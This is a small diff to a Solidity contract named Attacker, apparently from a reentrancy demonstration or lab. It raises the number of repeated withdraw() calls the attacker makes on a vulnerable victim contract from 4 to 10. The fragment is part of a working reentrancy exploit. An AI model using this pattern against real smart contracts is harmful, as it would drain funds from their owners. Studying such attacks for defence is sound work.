@@ -48,7 +48,7 @@ contract Attacker {
      * @dev Allows the attacker to initiate a reentrancy attack by calling the withdraw function of the vulnerable contract.
      */
     function withdrawAttack() public {
-        if (counter < 4) {
+        if (counter < 10) {
             (bool success, ) = payable(victim).call(
                 abi.encodeWithSignature("withdraw()")
             );
